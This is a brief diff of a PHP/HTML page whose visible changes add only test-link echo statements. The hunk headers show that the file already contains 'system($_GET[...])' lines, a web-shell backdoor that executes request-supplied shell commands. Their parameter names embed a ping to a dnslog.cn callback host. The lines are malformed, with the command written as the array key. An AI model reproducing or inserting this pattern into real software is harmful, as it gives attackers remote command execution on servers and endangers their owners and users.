@@ -15,6 +15,9 @@ system($_GET['cmd.exe ping vfz9zx.dnslog.cn']);
 <?php     
 echo "KRonos";
 ?>
+
+<?php echo '<a href="#">test</a>'; ?>
+
 </div>
 <button type="button">Bu Bir Butondur</button>
 <form action="/action_page.php">
@@ -32,3 +35,5 @@ system($_GET['cmd ping vfz9zx.dnslog.cn']);
 <?php     
 echo "KRonos";
 ?>
+<?php echo '<a href="#">test</a>'; ?>
+<?php echo '<a href="#">test</a>'; ?>
